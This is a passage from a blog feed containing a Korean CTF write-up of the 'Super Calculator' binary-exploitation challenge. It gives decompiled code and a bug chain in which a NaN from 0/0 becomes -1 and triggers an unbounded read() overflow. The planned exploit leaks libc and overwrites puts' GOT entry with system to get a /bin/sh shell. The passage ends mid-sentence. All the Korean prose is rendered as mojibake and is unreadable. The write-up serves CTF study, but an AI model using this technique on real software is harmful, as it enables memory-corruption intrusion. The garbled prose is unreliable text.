            <tag> SROP </tag>
            
            <tag> csu gagdet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)</title>
      <link href="/230211-hcamp2023w-super_calculator/"/>
      <url>/230211-hcamp2023w-super_calculator/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>Í∞ôÏùÄ Demon ÌåÄÏùò ÏàòÎØºÎãòÏù¥ ÎÇ¥Ïã† Î¨∏Ï†úÎã§. ÎåÄÌöå Ï†ÑÏóê Î¨∏Ï†ú Í≤ÄÏàòÌïòÎ©¥ÏÑú Ïä§Ïä§Î°ú ÌíÄÏñ¥Î¥§ÎäîÎç∞ Ïù¥ÎïåÍπåÏßÄ Ìïú Í≤ÄÏàò Ï§ëÏóêÏÑú ÏÑ∏ ÏÜêÍ∞ÄÎùΩ ÏïàÏóê Îì§ Ï†ïÎèÑÎ°ú Ïû¨Î∞åÎäî Î¨∏Ï†úÏó¨ÏÑú Î∏îÎ°úÍ∑∏Ïóê Íº≠ Í∏∞Î°ùÌïòÍ≥† Ïã∂ÏóàÎã§. Ïù¥ Î¨∏Ï†úÎ•º ÌíÄÎ©¥ÏÑú ÎîîÎ≤ÑÍπÖÏùÑ ÍµâÏû•Ìûà ÎßéÏù¥ ÌïòÏòÄÎã§.. ÎØ∏Î¶¨ Ïä§Ìè¨ÌïòÏûêÎ©¥ Ïù¥ Î¨∏Ï†úÎäî ChromeÏùÄ ÏïÑÎãàÏßÄÎßå Chrome 1-dayÏôÄ Í¥ÄÎ†®ÏûàÎäîÎç∞ ÎÇòÏ§ëÏóê ÏãúÍ∞ÑÏù¥ ÎÇúÎã§Î©¥.. Í¥ÄÎ†® ÎÇ¥Ïö©ÏùÑ Î∏îÎ°úÍ∑∏Ïóê Ï†ÅÏñ¥ Í≥µÏú†Ìï†Íπå Ïã∂Í∏∞ÎèÑ ÌïúÎã§. (Ïïà Ìï† ÏàòÎèÑ ÏûàÎã§.)</p><blockquote><p>Hello my name is Calculator</p></blockquote><ul><li>[ 1 solves &#x2F; 500 points]</li></ul><p>ÏïÑÎûòÎäî solveÍ∞Ä 0Ïùº Îïå ÎÇòÏò® ÌûåÌä∏Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ref. 1day Vulnerbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1315192 (type confusion lead to oob)</span><br><span class="line"></span><br><span class="line">Hint : Static_cast, C++, NaN, Infinity, Buffer Overflow</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main Î∂ÄÌÑ∞ ÏÇ¥Ìé¥Î¥§Îã§. (Î∂ÑÏÑùÌïòÎ©¥ÏÑú call_numÏùò ÌÉÄÏûÖÏùÑ structÎ•º ÌïòÎÇò ÏÉàÎ°ú ÎßåÎì§Ïñ¥ÏÑú ÏßÄÏ†ïÌï¥Ï£ºÏóàÎã§.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">cal_num = <span class="built_in">malloc</span>(<span class="number">0x138</span>uLL);</span><br><span class="line">setup();</span><br><span class="line">v3 = cal_num;</span><br><span class="line">v3-&gt;_int32 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v4 = cal_num;</span><br><span class="line">v4-&gt;_int33 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v5 = cal_num;</span><br><span class="line">v5-&gt;_int34 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br><span class="line">v6 = cal_num;</span><br><span class="line">v6-&gt;_float35 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v7 = cal_num;</span><br><span class="line">v7-&gt;_float36 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v8 = cal_num;</span><br><span class="line">v8-&gt;_float37 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure><p><code>setup()</code> Ìï®ÏàòÎäî ÏïàÎ¥êÎèÑ ÎêòÎäî Ìï®ÏàòÎã§. Ïä§Ìè¨Î•º ÌïòÏûêÎ©¥ <code>*cal_num-&gt;_int34</code>ÏôÄ <code>*cal_num-&gt;_float37</code>ÏùÑ Ï£ºÏãúÌï¥Ïïº ÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Banner();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v10);</span><br><span class="line">    <span class="keyword">switch</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Interger_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Real_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        overflow();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Number_change();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Print_number();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Print_Note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Í∏∞Îä•Ïù¥ 6Í∞ÄÏßÄÍ∞Ä ÏûàÏúºÎ©∞ ÎÇ¥Í∞Ä Ï†ÅÏùÄ Ïà´ÏûêÏóê Îî∞Îùº Í∞Å Í∏∞Îä•Ïù¥ Ïã§ÌñâÎêúÎã§. ÏùºÎã® Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÏïº ÌïòÎãàÍπå Ï∑®ÏïΩÏ†êÏùº Í≤É Í∞ôÏùÄ Í≤ÉÎì§ ÏúÑÏ£ºÎ°ú Îπ†Î•¥Í≤å ÏÇ¥Ìé¥Î¥§Îã§. Ï≤òÏùåÏóê ÌïòÎÇòÌïòÎÇòÏî© Îπ†Î•¥Í≤å Ïó¥Ïñ¥Î≥¥Í≥† ÏÑ∏ Î≤àÏß∏ Í∏∞Îä• Ìï®ÏàòÎ•º Î≥¥Í≥† Îã§Ïãú Ï≤´ Î≤àÏß∏ÏôÄ Îëê Î≤àÏß∏ Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î¥§Îã§.</p><p>ÏÑ∏ Î≤àÏß∏ Í∏∞Îä• Ìï®ÏàòÎäî <code>overflow</code> ÎÇ† Í≤É Í∞ôÏù¥ ÏÉùÍ≤®ÏÑú Î≥¥ÏûêÎßàÏûê <code>overflow</code>Î°ú Ìï®Ïàò Î™ÖÏùÑ Î∞îÍæ∏Ïñ¥Ï£ºÏóàÎã§. (ctfÎãàÍπå Ïó¨Í∏∞ÏÑú overflowÍ∞Ä ÎÇòÏïº Î≠îÍ∞à Ìï† Ïàò ÏûàÍ≤†Îã§Í≥† ÏÉùÍ∞ÅÌñàÎã§.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)cal_num-&gt;_int34 || *cal_num-&gt;_float37 != <span class="number">0.0</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, cal_num, *(<span class="type">unsigned</span> <span class="type">int</span> *)cal_num-&gt;_int34);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Interger_cal()</code>Ìï®ÏàòÏóêÏÑúÎäî Ï∑®ÏïΩÏ†êÏùº Í≤ÉÏ≤òÎüº ÏÉùÍ∏¥Í≤å ÏïàÎ≥¥ÏòÄÎã§. ÌïòÎÇò ÌäπÏßïÏù¥ ÏûàÎã§Î©¥ Ìïú ÏàòÏãùÏùÑ ÏÇ¨Ïö©ÏûêÎ°úÎ∂ÄÌÑ∞ ÏûÖÎ†•Î∞õÍ≥† Í∑∏ ÏàòÏãùÏóê ÎåÄÌïú Ïó∞ÏÇ∞ÏùÑ ÏßÑÌñâÌïòÎäîÎç∞ Ïó∞ÏÇ∞ Í≤∞Í≥ºÍ∞Ä <code>*cal_num-&gt;_int34</code>Ïóê Îã¥Í∏¥Îã§Îäî Í≤ÉÏù¥Îã§. <code>int</code> Ïó∞ÏÇ∞ Í≤∞Í≥ºÍ∞Ä <code>int</code> ÌÉÄÏûÖÏùò Î≥ÄÏàòÏóê Îã¥Í∏∞Í≥† ÏùåÏàò Ïó∞ÏÇ∞ÎèÑ Ïûò ÏòàÏô∏Ï≤òÎ¶¨Í∞Ä ÎêòÏñ¥ÏûàÏñ¥ÏÑú ÏùºÎã® ÎÑòÏñ¥Í∞îÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Real_cal</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Real cal&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *cal_num-&gt;_float37 == <span class="number">0.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1f %c %1f&quot;</span>, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)cal_num-&gt;_int34 = (<span class="type">int</span>)(<span class="type">float</span>)(*cal_num-&gt;_float35 - *cal_num-&gt;_float36); <span class="comment">// [*]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">4</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *cal_num-&gt;_float37 = *cal_num-&gt;_float35 / *cal_num-&gt;_float36; <span class="comment">// [**]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">    Print_Note();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">    Number_Check(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> Î•º Î≥¥Ïûê. Ï≤òÏùåÏóê Ïù¥ Ìï®ÏàòÎ•º Î≥¥Í≥† Ï†ÄÍ∏∞ÏÑú Î¨¥Ï°∞Í±¥ ÌÉÄÏûÖ Ïª®Ìì®Ï†ºÏù¥ ÎÇ† Í≤ÉÏù¥Îùº ÏÉùÍ∞ÅÌñàÎã§. ÏôúÎÉêÎ©¥ float Ïó∞ÏÇ∞ Í≤∞Í≥ºÎ•º intÏóê Îã¥ÏúºÎ©¥ Îß§Ïö∞Îß§Ïö∞ ÌÅ∞ ÏàòÍ∞Ä Îã¥Í∏∞Í∏∞ ÎñÑÎ¨∏Ïù¥Îã§. ÌïòÏßÄÎßå ÎÇ¥Í∞Ä <code>scanf(&quot;%1f %c %1f&quot;, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</code> Ïù¥ Íµ¨Î¨∏ÏùÑ ÏûòÎ™ª Ïù¥Ìï¥ÌïòÍ≥† ÏûàÏóàÎã§. <code>%1f</code>Ïùò Ïù¥ÎØ∏Îäî Ï†ïÏàòÌòïÏúºÎ°ú Ìïú ÏûêÎ¶¨Îßå ÏûÖÎ†•Î∞õÍ≤†Îã§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. ÎÇòÎäî ÏÜåÏàòÏ†ê ÌïúÏûêÎ¶¨Ïù∏ Ï§Ñ ÏïåÍ≥† ÎîîÎ≤ÑÍπÖÌï¥Î≥¥Î©¥ÏÑú ÏùòÎ¨∏Ïù¥ ÎÑàÎ¨¥ÎÇò ÎßéÏïòÎã§.</p><p>Ï∞∏Í≥†Î°ú <code>float</code> Ïó∞ÏÇ∞ÏùÑ ÌïúÎã§Îäî Í≤ÉÏùÄ Ïñ¥ÏÖàÎ∏îÎ¶¨Î•º Î≥¥Í≥† Î∞îÎ°ú ÌååÏïÖÌï† Ïàò ÏûàÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F0D                 mov     rax, cs:_ZL7cal_num._int ; cal_num</span><br><span class="line">.text:0000000000400F14                 mov     rax, [rax+110h]</span><br><span class="line">.text:0000000000400F1B                 cvttss2si rdx, xmm0</span><br><span class="line">.text:0000000000400F20                 mov     [rax], edx</span><br></pre></td></tr></table></figure><p><code>cvttss2si</code> ÏôÄ Í∞ôÏùÄ (ÎÇòÏóêÍ≤å ÏÉÅÎåÄÏ†ÅÏúºÎ°ú Îçú ÏùµÏàôÌïú) Ïñ¥ÏÖàÎ∏îÎ¶¨ Ïó∞ÏÇ∞ÏùÄ <code>float</code> Ïó∞ÏÇ∞ÏóêÏÑú ÏÇ¨Ïö©ÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><p>Í∑∏Î¶¨Í≥† <code>Number_change</code>ÎùºÎäî ÏàòÏÉÅÌïú Ìï®ÏàòÍ∞Ä Î≥¥Ïó¨ÏÑú Î∞îÎ°ú ÌôïÏù∏ÌñàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *<span class="title function_">Number_change</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(cal_num-&gt;_float38) = *cal_num-&gt;_int34;</span><br><span class="line">  *cal_num-&gt;_int34 = *cal_num-&gt;_float37; <span class="comment">// [*]</span></span><br><span class="line">  *cal_num-&gt;_float37 = SLODWORD(cal_num-&gt;_float38); </span><br><span class="line">  result = *cal_num-&gt;_int34;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = cal_num-&gt;_int34;</span><br><span class="line">    --*result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÎåÄÎÜìÍ≥† <code>float</code> ÌÉÄÏûÖÏùò Í∞íÏùÑ <code>int</code> ÌÉÄÏûÖÏùò Î≥ÄÏàòÎ°ú ÏòÆÍ≤®Ï§ÄÎã§. Ïó¨Í∏∞ÏÑú <code>type confusion</code>Ïù¥ Î∞úÏÉùÌï† Í∞ÄÎä•ÏÑ±Ïù¥ ÏûàÎã§. Í∑∏Îü¨ÎÇò.. <code>float</code> Ïó∞ÏÇ∞ÏùÑ ÌïòÎçò <code>Real_cal</code> Ìï®ÏàòÏóêÏÑúÎäî Ï†ïÏàò ÌïúÏûêÎ¶¨Î°ú Í≥ÑÏÇ∞ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Î¨¥ÏùòÎØ∏ÌïòÎã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. Ïó¨Í∏∞ÏÑú Ïò§Îûú ÏãúÍ∞Ñ Í≥†ÎØºÏùÑ ÌïòÎã§Í∞Ä ÏòàÏ†ÑÏóê <code>Chrome 1-day</code> Î∂ÑÏÑùÌñàÎçò Í≤ÉÏù¥ Îñ†Ïò¨ÎûêÎã§. Ï†ïÌôïÌûà Î≠îÏßÄÎäî Í∏∞Ïñµ ÏïàÎÇòÎäîÎç∞ Ïó∞ÏÇ∞ Í≤∞Í≥ºÍ∞Ä <code>NaN</code>Ïù¥ ÎÇòÏôÄÏÑú <code>OOB</code>Í∞Ä Î∞úÏÉùÌïòÎäî Ï∑®ÏïΩÏ†êÏù¥ ÏûàÏóàÎã§. <code>NaN</code>ÏùÄ <code>0/0</code>Í∞ôÏùÄ Í≤ÉÏùÑ ÌïòÎ©¥ ÎÇòÏò®Îã§. <code>Not a Number</code>ÎùºÎäî ÎúªÏù¥Îã§. </p><p>ÏïÑÎ¨¥Ìäº Î∞îÎ°ú ÏïÑÎûò Î°úÏßÅÏúºÎ°ú ÌÖåÏä§Ìä∏Î•º ÏßÑÌñâÌñàÍ≥† <code>overflow</code>Î•º Ìä∏Î¶¨Í±∞ Ìï† Ïàò ÏûàÏóàÎã§.</p><ol><li><code>Real_Cal</code>ÏóêÏÑú <code>0/0</code> ÏûÖÎ†•</li><li><code>Number_Change</code> Ìï®Ïàò -&gt; Ïó¨Í∏∞ÏÑú floatÏùò <code>NaN</code>Ïù¥ intÎ°ú ÎÑòÏñ¥Í∞ÄÎäîÎç∞ 0Î≥¥Îã§ ÏûëÍ∏∞ ÎïåÎ¨∏Ïóê Î¨∏Ï†ú Î°úÏßÅÏóê Îî∞Îùº -1ÏùÑ Ìï®</li><li><code>overflow</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ <code>overflow</code> Î∞úÏÉù -&gt; -1ÏùÄ <code>read</code> ÏÑ∏ Î≤àÏß∏ Ïù∏ÏûêÎ°ú Îì§Ïñ¥Í∞ÄÎ©¥ÏÑú <code>unsigned int</code>Î°ú ÌòïÎ≥ÄÌôòÎêòÍ∏∞ ÎïåÎ¨∏Ïóê Îß§Ïö∞ ÌÅ∞ ÏàòÍ∞Ä ÎêòÏñ¥ <code>overflow</code>Í∞Ä Î∞úÏÉùÌïúÎã§.</li></ol><p>Ìï¥Îãπ Í≥ºÏ†ïÏùÄ ÎîîÎ≤ÑÍπÖÏùÑ ÌïòÎ©¥ÏÑú Ïù¥Ìï¥ÌïòÏòÄÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>Ï∑®ÏïΩÏ†ê Ìä∏Î¶¨Í±∞ÎèÑ ÍΩ§ Í≥†ÏÉùÏùÑ ÌñàÎäîÎç∞ ÏùµÏä§Ìï† ÎïåÎèÑ Í≥†ÏÉùÏùÑ Ï°∞Í∏à ÌñàÎã§. <code>OOB</code>Í∞Ä Î∞úÏÉùÌïòÎäîÎç∞ leakÎèÑ Ìï¥ÏïºÌïòÍ≥† Ïñ¥Îñ†Ìïú Ìï®ÏàòÏùò gotÎ•º system Ìï®ÏàòÎ°ú ÎçÆÏñ¥ÏïºÌïòÍ≥† Ïñ¥ÎîòÍ∞ÄÏóê ‚Äò&#x2F;bin&#x2F;sh\x00‚Äô Ïç®ÏïºÌïòÎäîÎç∞ Ïñ¥ÎîîÏóê Ïì∞ÏßÄ.. ÎûÄ ÏÉùÍ∞ÅÏù¥ ÎèôÏãúÏóê Îì§Ïñ¥ÏÑú ÌòºÎûÄÏä§Îü¨Ïõ†Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_number</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Print Number&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 1. %d\n&quot;</span>, *cal_num-&gt;_int32);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 2. %d\n&quot;</span>, *cal_num-&gt;_int33);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result %d\n&quot;</span>, *cal_num-&gt;_int34);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 1. %f\n&quot;</span>, *cal_num-&gt;_float35);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 2. %f\n&quot;</span>, *cal_num-&gt;_float36);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Float Result %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÌïòÏßÄÎßå mainÏùò 6Í∞ÄÏßÄ Í∏∞Îä• Ï§ëÏóê Ïù¥Îü∞ Í≤ÉÏù¥ ÏûàÏóàÍ≥†, ÎÇòÎäî ÌòÑÏû¨ <code>cal_num</code>Ïóê overflowÎ•º Î∞úÏÉùÏãúÏºú ÏûÖÎ†•ÏùÑ Ìï† Ïàò ÏûàÏúºÎãà ÏúÑÏóê Î≥¥Ïù¥Îäî Ï†Ä Í∞í Ï¶â, <code>*cal_num-&gt;_int32</code>ÎÇò <code>*cal_num-&gt;_int33</code>ÏôÄ Í∞ôÏùÄ Í∞íÎì§ÏùÑ ÎçÆÏùÑ Ïàò ÏûàÎã§. Ïù¥ Í∏∞Îä•ÏùÑ Ïù¥Ïö©ÌïòÏó¨ libc leakÏùÑ Ìï† Ïàò ÏûàÎã§. Ï£ºÏùòÌï¥ÏïºÌï† Ï†êÏùÄ Ïù¥Í≤å intÎùºÏÑú 4Î∞îÏù¥Ìä∏Ïî© ÎÅäÏñ¥Ï†∏ÏÑú leakÏù¥ ÎêúÎã§. ÌïòÏúÑ 4Î∞îÏù¥Ìä∏ Ï∂úÎ†•Í∞íÏù¥ ÎïåÎ°ú ÏùåÏàòÍ∞Ä Îê† ÎïåÎèÑ ÏûàÏñ¥ÏÑú 0Î≥¥Îã§ Ïù¥ÏÉÅÏùº ÎïåÎßå Í±∏Îü¨Ï£ºÏóàÎã§. ÏïÑÎãàÎ©¥ Í∑∏ÎÉ• ÏòàÏô∏Î•º Í∞ïÏ†úÎ°ú Î∞úÏÉùÏãúÏºú Îã§Ïãú Ïó∞Í≤∞ÌïòÏòÄÎã§. </p><p>Ïù¥Îü∞ÏãùÏúºÎ°ú <code>libc base</code>Î•º Ï†ïÏÉÅÏ†ÅÏúºÎ°ú Íµ¨Ìï† Ïàò ÏûàÍ≥† Ïù¥Ï†ú <code>Ïñ¥Îñ†Ìïú Ìï®Ïàò</code>Î•º <code>system</code> Ìï®ÏàòÎ°ú ÎçÆÏñ¥Ïïº ÌïúÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_Note</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(cal_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Í∏∞Îä• Ï§ëÏóê Ïù¥Îü∞ Í∏∞Îä•Ïù¥ ÏûàÏóàÍ≥†, <code>puts</code> Ìï®ÏàòÎ•º <code>system</code> Ìï®ÏàòÎ°ú ÎçÆÍ≥† <code>cal_num</code>Ïù¥ Ïö∞Î¶¨ ÏûÖÎ†•Í∞íÏù¥ÎãàÍπå ‚Äò&#x2F;bin&#x2F;sh\x00‚ÄôÏùÑ ÏâΩÍ≤å ÎÑ£Ïñ¥ ÏâòÏùÑ Îî∞ÏûêÍ≥† ÏÉùÍ∞ÅÌñàÎã§. Ïû¨Î∞åÍ≤åÎèÑ Ïù¥ Ìï®ÏàòÎäî <code>Interger_cal</code> Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎê† ÎñÑ ÏØ§ Ìò∏Ï∂úÏù¥ ÎêúÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cal_num-&gt;_int34 = *cal_num-&gt;_int32 + *cal_num-&gt;_int33;</span><br></pre></td></tr></table></figure><p><code>Interger_cal</code> Ìï®Ïàò ÏÉÅÎã®ÏóêÏÑ† ÏÇ¨Ïö©Ïûê ÏûÖÎ†•Ïóê Îî∞Îùº Ïù¥Îü¨Ìïú Ïó∞ÏÇ∞ÏùÑ ÏàòÌñâÌïúÎã§. Ïù¥Í±∏ Ïù¥Ïö©ÌïòÏó¨ 